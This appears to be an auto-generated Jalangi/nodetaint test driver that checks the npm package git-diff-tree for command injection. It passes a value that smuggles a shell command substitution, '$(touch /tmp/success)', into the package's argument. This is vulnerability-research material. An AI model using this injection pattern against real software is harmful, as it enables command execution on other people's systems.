// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/git-diff-tree/node_modules/git-diff-tree');
try {
	var x0 = " $(touch /tmp/success);#";
var x1 = undefined;
new PUT(x0,x1)();
} catch (e) {
	console.log(e);
}